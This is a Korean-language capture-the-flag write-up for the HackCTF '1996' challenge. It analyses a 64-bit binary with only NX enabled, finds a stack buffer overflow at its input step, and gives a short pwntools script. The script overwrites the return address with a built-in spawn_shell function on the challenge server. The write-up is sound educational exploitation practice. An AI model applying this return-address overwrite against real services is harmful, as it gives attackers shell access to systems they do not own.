



# HACKCTF - 1996

---



![image](https://user-images.githubusercontent.com/33051018/68218007-fbb63100-0026-11ea-9f8a-0566ca44e7b1.png)

HackCTF의 1996 문제이다.



### 0x00. Binary Analysis



>![image](https://user-images.githubusercontent.com/33051018/68217849-ac700080-0026-11ea-8316-9d29d3e8962d.png)
>
>해당 파일은 64bit binary이며 동적 링크 방식을 채택하였다.
>
>
>![image](https://user-images.githubusercontent.com/33051018/68218146-3324dd80-0027-11ea-9098-c62b6f00b655.png)
>
>**checksec**을 통해 해당 바이너리에 적용된 메모리 보호기법을 확인해보았다.
>
>NX bit 만 활성화 되어있었다.
>
>일단 한번 실행시켜보도록 한다.
>
>![image](https://user-images.githubusercontent.com/33051018/68218254-5f405e80-0027-11ea-9b9b-b472eb7ad7ce.png)
>
>실행시켰더니 'Which environment variable do you want to read?' 라는 문자열을 출력한 뒤, 입력을 받는다.
>
>그 이후, 입력받은 값 + '='을 출력하는 루틴이다.
>
>이제 소스코드를 살펴보도록 한다.
>
>![image](https://user-images.githubusercontent.com/33051018/68218377-8e56d000-0027-11ea-8cc2-8b8ff3e3c215.png)
>
>디컴파일을 진행한 뒤 main의 모습이다.
>
>'Which env var do you want to read? ' 라는 문자열을 출력하 뒤, `name`변수 값을 입력받는 루틴이다.
>
>Line 16에서 `getenv`를 통해 `name` 변수에 값을 입력받는다. 하지만 입력값에 대한 길이 검증을 진행하지 않기 때문에 **BOF**취약점이 존재한다.
>
>따라서, `getenv`함수가 실행된 이후 복귀할 때의 `Return Address`를 조작할 수 있다.
>
>![image](https://user-images.githubusercontent.com/33051018/68218563-e1308780-0027-11ea-9ed5-e033d53311d3.png)
>
>또한, 해당 바이너리 파일 내부에는 `spawn_shell`이라는 함수가 존재하였다.
>
>이는 이름 그대로 쉘을 띄워주는 루틴을 가진 함수이다. 
>
>따라서, `getenv`를 통해 `BOF`를 시도하여 복귀주소를 spawn_shell 함수의 주소로 overwrite 한다.



###0x01. Exploit

---

>
>```python
>from pwn import *
>
>#p = process('./1996')
>p = remote('ctf.j0n9hyun.xyz', 3013)
>
>shell_func = 0x0000000000400897
>payload = ''
>payload += 'A'*1048
>payload += p64(shell_func)
>
>p.recvuntil('Which environment variable do you want to read? ')
>p.sendline(payload)
>
>p.interactive()
>```
>
>`Exploit Code`는 간단하다.
>
>`getenv`를 통해 값을 입력받을 때, `name` 변수 + 8 크기의 더미를 통해 **SFP**까지 덮고, `ret addr`에 접근하여
>
>`spawn_shell`함수의 주소를 overwrite해준다.

>![image](https://user-images.githubusercontent.com/33051018/68219232-02de3e80-0029-11ea-9964-05c6658e2592.png)

\